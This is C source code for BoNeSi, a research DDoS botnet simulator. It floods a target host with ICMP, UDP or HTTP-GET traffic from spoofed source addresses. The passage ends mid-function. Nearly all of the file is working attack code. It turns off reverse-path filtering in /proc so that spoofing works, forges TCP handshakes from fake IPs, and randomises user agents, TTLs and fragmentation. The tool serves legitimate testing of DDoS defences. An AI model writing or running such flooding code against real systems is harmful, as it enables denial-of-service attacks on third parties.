/*
 * Copyright 2006-2007 Deutsches Forschungszentrum fuer Kuenstliche Intelligenz 
 * 
 * You may not use this file except under the terms of the accompanying license.
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * Project: BoNeSi 
 * File: bonesi.c
 * Purpose: a DDoS Botnet Simulator for spoofing ICMP,UDP attacks and HTTP-GET floods
 * Responsible: Markus Goldstein
 * Primary Repository: https://github.com/Markus-Go/bonesi 
 * Web Sites: madm.dfki.de, www.goldiges.de 
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <time.h>
#include <math.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/times.h>
#include <getopt.h>

#include <libnet.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>

#include "tcpoptions.h"
#include "http.h"

#define STATS_SIZE 60

static const u_int32_t WINDOW_SIZE = 4096;
static const u_int16_t IP_ID = 0;
static const time_t TIMEOUT = 5;

// the port range to avoid conflicts with other programs running in
// promiscuous mode, e.g. other instances of BoNeSi running in parallel
static const u_int16_t MIN_PORT = 10000;
static const u_int16_t MAX_PORT = 35534;  // use 65534 instead of 65535 to avoid compiler warning on comparison

static u_int32_t finishedCount = 0;
static u_int32_t resetCount = 0;

/// to keep track of the connections
typedef enum{NOT_CONNECTED,CONNECTING,ESTABLISHED,CLOSED} CONNECTION_STATUS;

typedef struct {
    CONNECTION_STATUS status;
    //// for timeouts
    time_t startTime;
    ///index to referer in urlarray urls
    int referer;
    ///index to useragent in useragents
    int useragent;
    ///index to url number
    int url;
    ///payload offset
    int pload_offset;
} Connection;

unsigned long cnt;
int secondCounter;
u_int32_t dstIp, srcIp; //global variables for src and dest IP in network format!
u_short srcPort, dstPort;
libnet_ptag_t ipTag = 0;
libnet_ptag_t udpTag = 0;
libnet_ptag_t icmpTag = 0;
int ipSize;
int payloadSize = 32;
unsigned char *payload;
int rate = 0;
char* filename = NULL; //filename of ip list
char* urlfilename = NULL; //filename of url list  
char* useragentfilename = NULL; // filename of useragent list
char* device = NULL;
char* addr = NULL;
int stats[STATS_SIZE];
int success[STATS_SIZE];
int currStat;
char* statsFilename = "stats";
int proto= IPPROTO_UDP;
int integer = 0;
int toggle = 0;
int maxPackets = 0;
int url_flag = 0; //flag to indicate if a url has been specified with parameter -u
char request[URL_SIZE];
unsigned int MTU = 0;
unsigned int fragMode = 99;

pthread_t pcapThread;
extern char *optarg;

void parseArgs(int argc, char *argv[]);
void printArgs();
void buildIp(size_t ipSize, libnet_t *libnetHandle, libnet_ptag_t ipTag, u_int32_t srcIp);
void printIp(u_int32_t ip);
void* startPcap(void* arg);
void acknowledge(libnet_t *libnetHandle, pcap_t* pcapHandle);
void readIps();
int getIp(FILE *file, u_int32_t* ip);
ssize_t getline(char **lineptr, size_t *n, FILE *stream);
void initTcpOptions();
void sendAck(libnet_t *libnetHandle, const struct iphdr* ip, const struct tcphdr* tcp, u_int32_t key);

unsigned long numIps;
u_int32_t** srcIpsSpoof;
char** useragents;
int nuseragents = 0;
Url_array urls;
int rp_filter = NULL;
void INThandler(int);

TcpOption tcpOptions[NUM_TCP_OPTIONS];

Connection connections[65536*256];

// more output messages
int verbose = 0;

int main(int argc, char *argv[]) {
    srand(time(NULL)*getpid());
    parseArgs(argc, argv);
    
    char    buf[1024];
    FILE    *f = NULL;
    extern int errno;
    signal(SIGINT, INThandler);
   
    // we need to disable revesered path, otherwise we cannot spoof
    f = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "r");
    if(!f) {
        fprintf(stderr, "Can't open proc file system: %s. Make sure to disable rp_filter manually.\n", strerror( errno ));
    }
    else {
        if (!fgets(buf, 1023, f)) {
             fprintf(stderr, "Can't read proc file system. Permissions?");
        }
        rp_filter = atoi(buf);
        fclose(f);
    }
    
    if (rp_filter == 1) {
        f = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "w");
        if(!f) {
            fprintf(stderr, "Can't open proc file system: %s. Make sure to disable rp_filter manually.\n", strerror( errno ));
        }
        else {
            fprintf(f,"0");
            fclose(f);
       }
    }
    
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *libnetHandle = libnet_init(LIBNET_RAW4, device, errbuf);
    if (libnetHandle == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }
    if ((dstIp = libnet_name2addr4(libnetHandle, addr, LIBNET_RESOLVE)) == -1) {
        fprintf(stderr, "Bad destination IP address: %s\n", addr);
        libnet_destroy(libnetHandle);
        exit(EXIT_FAILURE);
    }
    free(addr);
    printArgs();
    
    if(filename) {
        readIps();
    } else {
        numIps = 1;
        srcIpsSpoof = (u_int32_t**)malloc(sizeof(u_int32_t*));
        srcIpsSpoof[0] = (u_int32_t*)malloc(sizeof(u_int32_t)*2);
        srcIpsSpoof[0][0] = ntohl(libnet_get_ipaddr4(libnetHandle));
        srcIpsSpoof[0][1] = 0;
    }
    
    if(urlfilename){
        urls = readURLs(urlfilename, verbose);
    }
    
    // -- for testing --
    if(verbose) {
        int s = urls.size;
        printf("Size of url array: %d\n",s);
        int i;
        for (i=0; i<s;i++){
            printf("%s/%s\n",urls.urls[i].host,urls.urls[i].path);
        }
    }
    
    if(useragentfilename){
        nuseragents = readUserAgents(&useragents, useragentfilename);
    }

    // -- for testing --
    if(verbose) {
        printf("Number of Useragents: %u\n", nuseragents);
        int i;
        for(i=0; i<nuseragents;i++){
            printf("Useragent[%u]: %s\n", i, useragents[i]);
        }
    }
    FILE *statsFile;
    
    bzero(stats, STATS_SIZE*sizeof(int));
    currStat = 0;
    
    payload = (unsigned char*)malloc(payloadSize);
    bzero(payload, payloadSize);
    
    int interval = 0;
    if (rate > 0) {
        interval = (int)(1000000.0f / (float)rate);
    }
    
    cnt = 0;  // total packet/request counter
    int ipIndex = 0;
    
    if(proto == IPPROTO_TCP) {
        initTcpOptions(tcpOptions);
        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setschedpolicy(&attr, SCHED_FIFO); 
        pthread_create(&pcapThread, &attr, &startPcap, NULL);
        // -- give the pcap thread time to settle down --
        sleep(1);
        u_int32_t i;
        for(i=0; i<65536*256; i++) {
            connections[i].status = NOT_CONNECTED;
            connections[i].startTime = 0;  // not started
            connections[i].referer = -1; // no referer used 
            connections[i].useragent = rand()%nuseragents;
        }
    }
    
    struct timeval startTime, endTime, tmpTime;
    long second = 0;
    secondCounter = 0;
    long totalCounter = 0;
    while ( !maxPackets || (cnt < maxPackets)) {
        u_int32_t* entry = srcIpsSpoof[ipIndex];
        srcIp = entry[0];
        if (entry[1] > 0) {
            srcIp = srcIp - (srcIp % 256)+ entry[(rand() % entry[1]) + 2];
        }
        u_int32_t e = (srcIp & 0xFF) << 16;
        srcIp = htonl(srcIp);
        
        cnt++;
        gettimeofday(&startTime, NULL);
        
        // -- search valid src port --
        int portSearchCnt = 0;
        do {
            srcPort = (rand() % (MAX_PORT-MIN_PORT)) + MIN_PORT;
            portSearchCnt++;
            if((portSearchCnt >= 10000) && (portSearchCnt % 10000 == 0)) {
                printf("%d port search iterations\n", portSearchCnt);
            }
        }while( (proto == IPPROTO_TCP)          // request tracking only on tcp
                && (connections[srcPort|e].status != NOT_CONNECTED)          // port free?
                && ((time(NULL) - connections[srcPort|e].startTime) <= TIMEOUT)  // port use timed out (probably packet loss)
              );
        
        size_t ipSize = 0;
        u_int8_t tcpOptionsIndex = 0;
        u_int32_t tcpLen;
        switch (proto) {
            case IPPROTO_ICMP:
                if((icmpTag = libnet_build_icmpv4_echo( ICMP_ECHO, 0, 0, 0x42, 0x42, 
                        payload, payloadSize, libnetHandle, 0)) == -1 ) {
                    fprintf(stderr, "Can't build icmp header: %s\n", libnet_geterror(libnetHandle));
                }
                ipSize = payloadSize + LIBNET_ICMPV4_ECHO_H;
                break;
            case IPPROTO_TCP:
                tcpOptionsIndex = randTcpOptionsIndex(tcpOptions);
                libnet_build_tcp_options(tcpOptions[tcpOptionsIndex].options,tcpOptions[tcpOptionsIndex].length,libnetHandle,0);
                tcpLen = LIBNET_IPV4_H + LIBNET_TCP_H;
                tcpLen += tcpOptions[tcpOptionsIndex].length - 20;
                if(libnet_build_tcp(srcPort, dstPort, rand(), 0, TH_SYN, WINDOW_SIZE, 0, 0, 
                                    tcpLen, 0, 0, libnetHandle, 0) == -1) {
                    fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
                }
                connections[srcPort|e].status = CONNECTING; //port is used. syn sent
                connections[srcPort|e].startTime = time(NULL); // store time for timeout
                ipSize = LIBNET_TCP_H;
                break;
            default:
                if((udpTag = libnet_build_udp(srcPort, dstPort,
                        LIBNET_UDP_H + payloadSize, 0,
                        payload, payloadSize, libnetHandle, 0)) == -1) {
                    fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(libnetHandle));
                }
                ipSize = payloadSize + LIBNET_UDP_H;
                break;
        }
        buildIp(ipSize, libnetHandle, ipTag, srcIp);
        
        if (libnet_write(libnetHandle) == -1) {
            fprintf(stderr, "Can't send IP packet: %s\n", libnet_geterror(libnetHandle));
            return EXIT_FAILURE;
        }
        libnet_clear_packet(libnetHandle);
        
        secondCounter++;
        totalCounter++;
        
        // -- if we don't send with unlimited rate, we have to wait a little bit --
        if (rate > 0) {
            gettimeofday(&endTime, NULL);
            long wait = interval - (((endTime.tv_sec - startTime.tv_sec)
                    * 1000000) + (endTime.tv_usec - startTime.tv_usec));
            // -- usleep only works correctly with times above a certain threshold --
            if(wait > 10000) {
                usleep(wait);
            // -- if delay too short for usleep, use a 'do-nothing-loop'
            } else {
                long delay = 0;
                while (delay < wait) {
                    gettimeofday(&tmpTime, NULL);
                    delay = (((tmpTime.tv_sec - endTime.tv_sec) * 1000000)
                            + (tmpTime.tv_usec - endTime.tv_usec));
                }
            }
        }
        
        // -- print stats every second --
        gettimeofday(&endTime, NULL);
        second += (((endTime.tv_sec - startTime.tv_sec) * 1000000)
                + (endTime.tv_usec - startTime.tv_usec));
        if (second >= 1000000) {
            printf("%d %s in %f seconds\n",    secondCounter,
                    proto==IPPROTO_TCP?"requests":"packets",second / 1000000.0f);
            if(proto == IPPROTO_TCP) {
                u_int32_t fc = finishedCount;     // copy it to minimize error due asynchronous threads
                finishedCount = 0;
                success[currStat] = fc;
                printf("\t%u finished correctly\n", fc);
                
                fc = resetCount;
                resetCount = 0;
                printf("\t%u resets received\n", fc);
            }
            if (statsFilename) {
                stats[currStat] = secondCounter;
                if ((statsFile = fopen(statsFilename, "w")) == NULL) {
                    fprintf(stderr,"Stats file %s could not be opened.\n", statsFilename);
                } else {
                    int i;
                    for (i=1; i<=STATS_SIZE; i++) {
                        int t = -STATS_SIZE + i;
                        int packets = stats[(currStat+i)%STATS_SIZE];
                        int traffic = 0;
                        if(proto == IPPROTO_TCP) {
                            traffic = success[(currStat+i)%STATS_SIZE];
                        } else {
                            traffic = packets * (LIBNET_IPV4_H + ipSize) * 8;
                            traffic /= 1024 * 1024;
                        }
                        fprintf(statsFile, "%d %d %d\n", t, packets, traffic);
                    }
                }
                fclose(statsFile);
                currStat++;
                currStat %= STATS_SIZE;
            }
            secondCounter = 0;
            second = 0;
        }
        ipIndex >= numIps-1 ? ipIndex = 0 : ipIndex++;
    }

    libnet_destroy(libnetHandle);
    free(payload);
    /*free(stats);*/
    printf("%lu %s sent\n", totalCounter, proto==IPPROTO_TCP?"requests ":"packets");
    if(proto == IPPROTO_TCP) {
        pthread_join(pcapThread, NULL);
    }
    // set rp_filter back to original value ...
    if (rp_filter == 1) {
        f = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "w");
        if(!f) {
            fprintf(stderr, "Can't open proc file system: %s. Make sure to disable rp_filter manually.\n", strerror( errno ));
        }
        else {
            fprintf(f,"1");
            fclose(f);
       }
    }
    return EXIT_SUCCESS;
}

/**
 * reads ips from file and stores them into a local data structure
 */ 
void readIps() {
    FILE *file;
    if ( (file = fopen(filename, "r")) == NULL) {
        fprintf(stderr,"File %s could not be opened.\n", filename);
        exit(EXIT_FAILURE);
    }
    printf("reading file...");
    fflush(stdout);
    numIps = 0;
    while ((getIp(file, &srcIp)) && !feof(file)) {
        numIps++;
    }
    rewind(file);
    srcIpsSpoof = (u_int32_t**)malloc(numIps * sizeof(u_int32_t*));
    unsigned long cnt = 0;
    while (!feof(file) && (getIp(file, &srcIp))) {
        int nbr = 0;
        if (toggle > 0) {
            nbr = (rand() % toggle) + 1;
        }
        u_int32_t* entry = (u_int32_t*)malloc(sizeof(u_int32_t)*(nbr+2));
        entry[0] = srcIp;
        entry[1] = nbr;
        int i;
        for (i = 0; i < nbr; i++) {
            entry[i+2] = rand() % 256;
        }
        srcIpsSpoof[cnt++] = entry;
    }
    fclose(file);
    printf("done\n");
}

/**
 * reads the next ip from a given file
 * @param file the file to read from
 * @param ip where to store the read ip 
 * @return 1 on success, 1 otherwise
 */
int getIp(FILE *file, u_int32_t* ip) {
    if (integer) {
        if (fscanf(file, "%u", ip) != 1) {
            return 0;
        }
    } else {
        int ips[5];
        if (fscanf(file, "%u.%u.%u.%u", &ips[0], &ips[1], &ips[2], &ips[3]) != 4) {
            return 0;
        }
        *ip = (u_int32_t) (ips[0]*256*256*256+ips[1]*256*256+ips[2]*256+ips[3]);
    }
    return 1;
}

/**
 * @return the number of a by string given protocol
 */
int getProto(char* name) {
    if (!strncasecmp(name, "udp", 3)) {
        return IPPROTO_UDP;
    } else if (!strncasecmp(name, "icmp", 4)) {
        return IPPROTO_ICMP;
    } else if (!strncasecmp(name, "tcp", 3)) {
        return IPPROTO_TCP;
    } else {
        fprintf(stderr, "unknown ip protocol: %s\n", name);
        exit(EXIT_FAILURE);
    }
}

/**
 * prints the usage, available parameters, .. of the program
 */
void printUsage(int argc, char *argv[]) {
    printf("Usage: %s [OPTION...] <dst_ip:port>\n\n", argv[0]);
    printf(" Options:\n\n");
    printf("  -i, --ips=FILENAME               filename with ip list\n");
    printf("  -p, --protocol=PROTO             udp (default), icmp or tcp\n");
    printf("  -r, --send_rate=NUM              packets per second, 0 = infinite (default)\n");
    printf("  -s, --payload_size=SIZE          size of the paylod, (default: 32)\n");
    printf("  -o, --stats_file=FILENAME        filename for the statistics, (default: 'stats')\n");
    printf("  -c, --max_packets=NUM            maximum number of packets (requests at tcp/http), 0 = infinite (default)\n");
    printf("      --integer                    IPs are integers in host byte order instead of in dotted notation\n");
    printf("  -t, --max_bots=NUM               determine max_bots in the 24bit prefix randomly (1-256)\n");
    printf("  -u, --url=URL                    the url (default: '/') (only for tcp/http)\n");
    printf("  -l, --url_list=FILENAME          filename with url list (only for tcp/http)\n");
    printf("  -b, --useragent_list=FILENAME    filename with useragent list (only for tcp/http)\n");
    printf("  -d, --device=DEVICE              network listening device (only for tcp/http)\n");
    printf("  -m, --mtu=NUM                    set MTU, (default 1500)\n");
    printf("  -f, --frag=NUM                   set fragmentation mode (0=IP, 1=TCP, default: 0)\n");
    printf("  -v, --verbose                    print additional debug messages\n");
    printf("  -h, --help                       print this message and exit\n");

    printf("\n");
}

/**
 * parses the arguments passed to the programm and stores the values in the
 * according global variables
 */
void parseArgs(int argc, char *argv[]) {
    if(argc<2)
        printUsage(argc, argv);
    static struct option long_options[] = {
        {"protocol", required_argument, 0, 'p'},
        {"paylod_size", required_argument, 0, 's'},
        {"ips", required_argument, 0, 'i'},
        {"send_rate", required_argument, 0, 'r'},
        {"stats_file", required_argument, 0, 'o'},
        {"max_packets", required_argument, 0, 'c'},
        {"max_bots", required_argument, 0, 't'},
        {"url", required_argument, 0, 'u'},
        {"url_list", required_argument, 0, 'l'},
        {"useragent_list", required_argument, 0, 'b'},
        {"device", required_argument, 0, 'd'},
        {"integer", no_argument, &integer, 1},
        {"mtu", no_argument, 0, 'm'},
        {"frag", no_argument, 0, 'f'},
	{"verbose", no_argument, 0, 'v'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    dstIp = 0;
    dstPort = 0;
    filename = NULL; //filename of ips
    urlfilename = NULL; //filename of urls
    int c;
    int option_index = 0;
    char* portStart;
    request[0] = '\0'; 
    Url u;
    u.host[0] = '\0';
    u.path[0] = '\0';
    u.protocol [0] = '\0';    
    while ((c = getopt_long(argc, argv, ":b:s:r:p:i:o:c:t:hvu:l:d:m:f:",long_options, &option_index)) != -1) {
        switch (c) {
        case 'b':
            useragentfilename = optarg;
            break;    
        case 's':
            payloadSize = abs(atoi(optarg));
            break;
        case 'r':
            rate = abs(atoi(optarg));
            break;
        case 'i':
            filename = optarg;
            break;
        case 'o':
            statsFilename = optarg;
            break;
        case 'p':
            proto = getProto(optarg);
            break;
        case 'c':
            maxPackets = abs(atoi(optarg));
            break;
        case 't':
            toggle = abs(atoi(optarg));
            break;
        case 'h':
            printUsage(argc, argv);
            exit(EXIT_SUCCESS);
            break;
        case 'v':
            verbose = 1;
            break;
        case 'u':
            url_flag = 1; 
            sscanf(optarg,"%50[^:/]://%2000[^/]/%s", u.protocol, u.host, u.path);
            //sprintf(u.url, "%s/%s",u.host,u.path);
            //sprintf(request, "GET %s HTTP/1.0\r\nConnection: close\r\n\r\n", optarg);
            //char buffer[4096];      
            break;
        case 'l':
            urlfilename = optarg;
            break;    
        case 'd':
            device = optarg;
            break;
        case 'm':
            MTU = ((abs(atoi(optarg))+7)/8)*8;
            break;
        case 'f':
            fragMode= abs(atoi(optarg));
            if (fragMode != 0 && fragMode != 1) fragMode = 0;
            break;
        }
    }
    // -- parse destination address and port --
    if (option_index < argc) {
        char* v = argv[argc-1];
        portStart = strrchr(v, ':');
        if (portStart == NULL) {
            fprintf(stderr, "Bad destination port: %s\n", v);
            exit(EXIT_FAILURE);
        }
        dstPort = (u_short)atoi(portStart + 1);
        addr = (char*)malloc(portStart-v+1);
        strncpy(addr, v, portStart-v);
        addr[portStart-v] = '\0';
    } else {
        printUsage(argc, argv);
        exit(EXIT_FAILURE);
    }
    if (proto == IPPROTO_TCP && !device) {
        printf("-d necessary for tcp\n");
        exit(EXIT_FAILURE);
    }
    if (url_flag && urlfilename){
        printf("Warning: both -l and -u; The URL given with -u will not be used!\n");
    }
    if(!url_flag){
        strcpy(u.protocol,"http");
        strcpy(u.host,"www.google.de");
    }
    if (!urlfilename){
        urls.size = 1;
        Url* urllist;
        urllist = malloc(1*sizeof(Url));
        urllist[0] = u;
        urls.urls = urllist;
    }
    if (!useragentfilename){
        printf("Warning: There is noch File with useragent names! ");
        useragents = (char**)malloc(sizeof(char*));
        useragents[0] = (char*)malloc(USERAGENT_SIZE);
        strcpy(useragents[0],"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)");
        nuseragents = 1;
        printf("The user-agent:\n %s\nwill be used.\n", useragents[0]);
    }
    if (proto != IPPROTO_TCP && (MTU != 0 || fragMode != 99)) {
        printf("-f and -m (Fragmentation support) only for TCP available\n");
        exit(EXIT_FAILURE);
    }
    else {
      // set defaults if TCP and fragmentation not set.
      if (MTU == 0) {
	MTU = 1500;
      }
      if (fragMode == 99) {
	fragMode = 0;
      }
    }
}

/**
 * prints the values of (almost) every parameter
 */
void printArgs() {
    printf("dstIp:         %d.%d.%d.%d\n", dstIp & 0xFF, (dstIp >> 8) & 0xFF, (dstIp >> 16) & 0xFF, (dstIp >> 24) & 0xFF);
    printf("dstPort:       %d\n", dstPort);
    printf("protocol:      %d\n", proto);
    printf("payloadSize:   %d\n", payloadSize);
    if (proto == IPPROTO_TCP) {
      printf("MTU:           %d\n", MTU);
      (fragMode > 0) ? printf("fragment mode: TCP\n")
	      : printf("fragment mode: IP\n");
    }
    (rate > 0) ? printf("rate:          %d\n", rate)
            : printf("rate:          infinite\n");
    printf("ips:           %s\n", filename);
    printf("urls:          %s\n", urlfilename);
    printf("useragents::   %s\n", useragentfilename);
    printf("stats file:    %s\n", statsFilename);
    printf("device:        %s\n", device);
    (maxPackets > 0) ? printf("maxPackets:    %d\n", maxPackets)
            : printf("maxPackets:    infinite\n");
    printf("format:        ");
    integer ? printf("integer\n") : printf("dotted\n");
    printf("toggle:        ");
    toggle ? printf("yes: max %d bots\n", toggle) : printf("no\n");
    /* should not be necessarry anymore
    if(proto == IPPROTO_TCP) {
        if(request[0]=='\0')
            strcpy(request, "GET / HTTP/1.0\r\nConnection: close\r\n\r\n");
        printf("request:       %s\n", request);
    }
    */
}

/**
 * builds the ip packet with libnet
 * mainly a (unnecessary?) wrapper for libnet_build_ipv4
 */
void buildIp(size_t ipSize, libnet_t *libnetHandle, libnet_ptag_t ipTag, u_int32_t srcIp) {
    ipTag = libnet_build_ipv4(
            LIBNET_IPV4_H + ipSize, 
            0, /* TOS */
            IP_ID,
            0, /* IP Frag */
            (rand() % 253) + 3, /* TTL */
            proto,
            0, /* checksum */ 
            srcIp, dstIp,
            NULL, /* payload */
            0, /* payload size */
            libnetHandle, ipTag);
    if(ipTag == -1) {
        fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(libnetHandle));
    }
}

/**
 * prints an ip in integer notation in dotted notation
 */
void printIp(u_int32_t ip) {
    printf("%d.%d.%d.%d\n", (ip >> 24) & 0xFF, (ip >> 16) & 0xFF, (ip >> 8) & 0xFF, ip & 0xFF);
}

/**
 * entry point for the pcap capture thread
 */
void* startPcap(void* arg) {
    char pcapErrbuf[PCAP_ERRBUF_SIZE];
    char libnetErrbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *libnetHandle = libnet_init(LIBNET_RAW4, device, libnetErrbuf);
    if (libnetHandle == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", libnetErrbuf);
        exit(EXIT_FAILURE);
    }
    bpf_u_int32 mask, net;
    struct bpf_program bpf;
    char filter[256];
    char* device = (char*)libnet_getdevice(libnetHandle);
    sprintf(filter,"tcp and src host %d.%d.%d.%d and src port %u",
            dstIp & 0xFF, (dstIp >> 8) & 0xFF, (dstIp >> 16) & 0xFF, (dstIp >> 24) & 0xFF, dstPort);
    
    /* Find the properties for the device */
    if (pcap_lookupnet(device, &net, &mask, pcapErrbuf) == -1) {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", device, pcapErrbuf);
        net = 0;
        mask = 0;
        return NULL;
    }
    /* Open the session in promiscuous mode without timeout */
    pcap_t* pcapHandle = pcap_open_live(device, BUFSIZ, 1, 0, pcapErrbuf);
    if (pcapHandle == 0) {
        fprintf(stderr, "Couldn't open device %s: %s\n", device, pcapErrbuf);
        return NULL;
    }
    /* Compile and apply the filter */
    if (pcap_compile(pcapHandle, &bpf, filter, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter, pcap_geterr(pcapHandle));
        return NULL;
    }
    if (pcap_setfilter(pcapHandle, &bpf) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter, pcap_geterr(pcapHandle));
        return NULL;
    }
    pcap_freecode(&bpf);
    while (1) {
        acknowledge(libnetHandle, pcapHandle);
    }
}

/**
 * handler for received packets
 * sends the answering packets if needed
 */
void acknowledge(libnet_t *libnetHandle, pcap_t* pcapHandle) {
    static struct pcap_pkthdr header;
    static const u_char *sniffedPacket;
    static const struct iphdr* ip;
    static const struct tcphdr* tcp;
    unsigned int max_pload_size;
    int packet_pload_size, total_pload_size;
    int pload_offset;
    u_int8_t *p;

    //printf("achnowledge\n");
    //static size_t x = 0;
    sniffedPacket = pcap_next(pcapHandle, &header);
    if (!sniffedPacket) {
        //fprintf(stderr, "Error sniffing packet: %s\n", pcap_geterr(pcapHandle));
	return;
    }
    ip = (struct iphdr*) (sniffedPacket + sizeof(struct ether_header));
    u_int32_t sIp = ip->daddr; //IP we want to send to
    tcp = (struct tcphdr*) (sniffedPacket + sizeof(struct ether_header) + sizeof(struct iphdr));
    
    // used for connection tracking
    u_int16_t origSrcPort = ntohs(tcp->dest);
    u_int32_t key = ((u_int32_t)origSrcPort) | ((ntohl(ip->daddr) & 0xFF) << 16);
    
    // -- check if we are responsible for this packet --
    if(origSrcPort < MIN_PORT || origSrcPort > MAX_PORT || connections[key].status == NOT_CONNECTED) {
        return;
    }
    
    //check if RST flag is sent
    if (tcp->rst){ // the connection has been reset, so we have to start again with the 3 way handshake and send a SYN
        
        resetCount++;
        
        // -- answer only resets on a fully established connection --
        // -- (resets on a 'CONNECTING' connections means 'connection refused') --
        if(connections[key].status == ESTABLISHED) {
            int tcpOptionsIndex = randTcpOptionsIndex(tcpOptions);
            libnet_clear_packet(libnetHandle);
            libnet_build_tcp_options(tcpOptions[tcpOptionsIndex].options,tcpOptions[tcpOptionsIndex].length,libnetHandle,0);
            int tcpLen = LIBNET_IPV4_H + LIBNET_TCP_H;
            tcpLen += tcpOptions[tcpOptionsIndex].length - 20;
            if(libnet_build_tcp(origSrcPort, dstPort, rand(), 0, TH_SYN, WINDOW_SIZE, 0, 0, 
                                tcpLen, 0, 0, libnetHandle, 0) == -1) {
                fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
            }
            connections[key].status = CONNECTING; //port is used. syn sent
            connections[key].startTime = time(NULL); // store time for timeout
            ipSize = LIBNET_TCP_H;
    
            buildIp(ipSize, libnetHandle, ipTag, sIp);
            
            if (libnet_write(libnetHandle) == -1) {
                fprintf(stderr, "Can't send IP packet: %s\n", libnet_geterror(libnetHandle));
            } else {
                cnt++;
                secondCounter++;
            }
        }
    // -- first data packet -> request --
    } else if (tcp->syn && tcp->ack) {
        connections[key].status = ESTABLISHED;
        
        // -- ack and request in separated packets --
        sendAck(libnetHandle, ip, tcp, key);

        // get url with random number 
        int url_number = rand() % urls.size;
        int ref_number = connections[key].referer;
        int useragent_number = connections[key].useragent;
        
        //to ensure that the referer has not the same host and path as the requested file
        while((url_number==ref_number)&&(urls.size > 1)){
            url_number = rand() % urls.size;
            if(verbose) {
                printf("While: url: %d, ref: %d\n", url_number, ref_number);
            }
        }
        
        // build the request with url, referer and useragent numbers
        buildRequest(request, url_number, ref_number, useragent_number, urls, useragents);
        
        if(verbose) {
            printf("%s\n",request);
        }
        
        uint32_t remoteAck = ntohl(tcp->ack_seq);
        uint32_t remoteSeq = ntohl(tcp->seq);
        max_pload_size = (MTU - LIBNET_IPV4_H - LIBNET_TCP_H);
        max_pload_size -= (max_pload_size % 8);
        total_pload_size = strlen(request);
        if (max_pload_size > total_pload_size) {
            // -- packet is smaller than MTU --
            if(urls.size > 1){
                connections[key].referer = url_number;
            }
            libnet_clear_packet(libnetHandle);
            if(libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
                    TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + total_pload_size,
                    (unsigned char*)request, total_pload_size, libnetHandle, 0)==-1) {
                fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
            }
            buildIp(total_pload_size, libnetHandle, 0, sIp);
            if (libnet_write(libnetHandle) == -1) {
                fprintf(stderr, "Can't send tcp ack/fin packet: %s\n", libnet_geterror(libnetHandle));
            }
        } else {
            // -- fragmentation goes here --
            if (fragMode == 0) {
                // -- using IP fragmentation --
                if(urls.size > 1){
                    connections[key].referer = url_number;
                }

                int hdr_offset = IP_MF;
                u_int16_t ip_id;
                u_int32_t pkt_chksum, pbuf_size, pbuf_size2;
                libnet_ptag_t tcp_tag, ip_tag;
                struct libnet_ipv4_hdr *iph_p;
                struct libnet_tcp_hdr *tcph_p;
                u_int8_t *packet;

                libnet_clear_packet(libnetHandle);
                ip_id = (u_int16_t)libnet_get_prand(LIBNET_PR16);
                packet_pload_size = max_pload_size;

                tcp_tag = libnet_build_tcp(origSrcPort, dstPort, remoteAck, remoteSeq+1, 
                        TH_ACK, WINDOW_SIZE, 0, 0, LIBNET_IPV4_H + LIBNET_TCP_H - 20 + total_pload_size,
                        (unsigned char*)request, total_pload_size, libnetHandle, 0);
                if(tcp_tag==-1) {
                    fprintf(stderr, "Can't build tcp header: %s\n", libnet_geterror(libnetHandle));
                }

                ip_tag = libnet_build_ipv4(
                            LIBNET_IPV4_H + total_pload_size,
                            0, /* TOS */
                            ip_id,
                            0, /* IP Frag */
                            (rand() % 253) + 3, /* TTL */
                            proto,
                            0, /* checksum */ 
                            sIp, dstIp,
                            NULL, /* payload */
                            0, /* payload size */
                            libnetHandle, ipTag);
                if (ip_tag == -1) {
                        fprintf(stderr, "Can't build ipv4 header: %s\n", libnet_geterror(libnetHandle));
                }

                u_int8_t *pkt_buf;

                pbuf_size = libnet_getpbuf_size(libnetHandle, ip_tag);
                pbuf_size2 = libnet_getpbuf_size(libnetHandle, tcp_tag);
                pkt_buf = malloc(pbuf_size+pbuf_size2+total_pload_size);

                p = pkt_buf;
                packet = libnet_getpbuf(libnetHandle, ip_tag);
                memcpy(p, packet, pbuf_size);
                p += pbuf_size;
                packet = libnet_getpbuf(libnetHandle, tcp_tag);
                memcpy(p, packet, pbuf_size2);
                p += pbuf_size2;
                memcpy(p, request, total_pload_size);

                iph_p = (struct libnet_ipv4_hdr *)(pkt_buf);
                tcph_p = (struct libnet_tcp_hdr *)(pkt_buf + (iph_p->ip_hl << 2));
                libnet_do_checksum(libnetHandle, pkt_buf, IPPROTO_TCP, pbuf_size2+total_pload_size);

                libnet_clear_packet(libnetHandle);

                p = (u_int8_t *)tcph_p;
                total_pload_size += pbuf_size2;

                if (libnet_build_ipv4(
                        LIBNET_IPV4_H + packet_pload_size,
                        0, /* TOS */
